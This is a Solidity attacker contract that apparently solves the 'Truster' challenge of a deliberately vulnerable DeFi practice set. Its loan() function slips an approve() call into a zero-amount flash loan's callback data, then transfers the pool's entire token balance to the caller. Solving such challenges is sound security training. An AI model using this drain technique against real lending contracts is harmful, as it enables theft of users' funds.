
import "./TrusterLenderPool.sol";
import "hardhat/console.sol";
import "../DamnValuableToken.sol";

contract AttackerTruster {
    TrusterLenderPool immutable trusterLenderPool;
    DamnValuableToken immutable damnValuableToken;
    address owner;

    constructor(address _trusterLenderPool, address _damnValuableToken){
        trusterLenderPool = TrusterLenderPool(_trusterLenderPool);
        damnValuableToken = DamnValuableToken(_damnValuableToken);
        owner = msg.sender;
    }

    function loan() external{
        uint256 tokenAmount = damnValuableToken.balanceOf(address(trusterLenderPool));
        bytes memory _data =  abi.encodeWithSignature(
                "approve(address,uint256)",
                address(this),
                tokenAmount
            );
        trusterLenderPool.flashLoan(0, msg.sender, address(damnValuableToken), _data);

         damnValuableToken.transferFrom(address(trusterLenderPool), msg.sender, tokenAmount);
    }

   



}